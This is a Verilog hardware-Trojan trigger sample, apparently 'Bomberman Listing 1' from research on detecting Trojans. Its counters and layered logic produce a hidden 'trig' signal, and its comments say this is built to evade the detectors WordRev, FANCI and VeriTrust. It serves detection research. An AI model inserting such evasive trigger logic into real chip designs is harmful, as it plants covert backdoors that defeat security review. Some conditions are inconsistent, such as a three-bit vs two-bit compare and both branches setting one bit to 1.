// [TROJAN TRIGGER START]
// [TROJAN TRIGGER TYPE] - Bomberman Listing 1
reg [15:0] count_1;
reg [15:0] count_2;

reg [6:0] deploy_1;
reg [6:0] deploy_2;

// Update SSCs non-uniformly and sporadically
// to defeat WordRev and Power Resets
always @(posedge imm[3]) begin
    if (reset) begin
        count_1 <= 0;
        count_2 <= 0;
    end else begin
        count_1 <= count_1 + alu_out[3:0];
        count_2 <= count_2 + alu_out[3:0];
    end
end

// Distribute trigger activation input signal (count_1)
// across layers of sequential logic to defeat FANCI
always @(posedge clk) begin
    if (reset) begin
        deploy_1[3:0] = 0;
    end else begin
        if (count_1[3:0] == 'b0101)
            deploy_1[0] <= 1;
        else
            deploy_1[0] <= 0;

        if (count_1[7:4] == 'b1111)
            deploy_1[1] <= 1;
        else
            deploy_1[1] <= 0;

        if (count_1[11:8] == 'b0000)
            deploy_1[2] <= 1;
        else
            deploy_1[2] <= 0;

        if (count_1[15:12] == 'b1011)
            deploy_1[3] <= 1;
        else
            deploy_1[3] <= 0;
    end
end

always @(posedge clk) begin
    if (reset) begin
        deploy_1[6:4] = 0;
    end else begin
        if (deploy_1[2:0] == 2'b11)
            deploy_1[4] <= 1;
        else
            deploy_1[4] <= 0;

        if (deploy_1[3:2] == 2'b11)
            deploy_1[5] <= 1;
        else
            deploy_1[5] <= 1;

        if (deploy_1[5:4] == 2'b11)
            deploy_1[6] <= 1;
        else
            deploy_1[6] <= 0;
    end
end


// Distribute trigger activation input signal (count_2)
// across layers of sequential logic to defeat FANCI
always @(posedge clk) begin
    if (reset) begin
        deploy_2[3:0] = 0;
    end else begin
        if (count_2[3:0] == 'b0101)
            deploy_2[0] <= 1;
        else
            deploy_2[0] <= 0;

        if (count_2[7:4] == 'b1111)
            deploy_2[1] <= 1;
        else
            deploy_2[1] <= 0;

        if (count_2[11:8] == 'b0000)
            deploy_2[2] <= 1;
        else
            deploy_2[2] <= 0;

        if (count_2[15:12] == 'b1011)
            deploy_2[3] <= 1;
        else
            deploy_2[3] <= 0;
    end
end

always @(posedge clk) begin
    if (reset) begin
        deploy_2[6:4] = 0;
    end else begin
        if (deploy_2[2:0] == 2'b11)
            deploy_2[4] <= 1;
        else
            deploy_2[4] <= 0;

        if (deploy_2[3:2] == 2'b11)
            deploy_2[5] <= 1;
        else
            deploy_2[5] <= 1;

        if (deploy_2[5:4] == 2'b11)
            deploy_2[6] <= 1;
        else
            deploy_2[6] <= 0;
    end
end

// Hide trigger activation signals (deploy_1 and deploy_2)
// inside fan-in logic cone of three additional signals
// (h_1, h_2, and h_3) to evade VeriTrust.
reg h_1;
reg h_2;
reg h_3;
always @(posedge clk) begin
    if (reset) begin
        h_1 <= 0;
        h_2 <= 0;
        h_3 <= 0;
    end else begin
        h_1 <= deploy_1[6];
        h_2 <= ~deploy_2[6] & alu_op[0] & alu_op[1] | deploy_2[6];
        h_3 <= (~deploy_1[6] | deploy_2[6]) & (alu_op[0] & alu_op[1]);
    end
end

wire trig = (h_1 & h_2) & h_3;
// [TROJAN TRIGGER END]
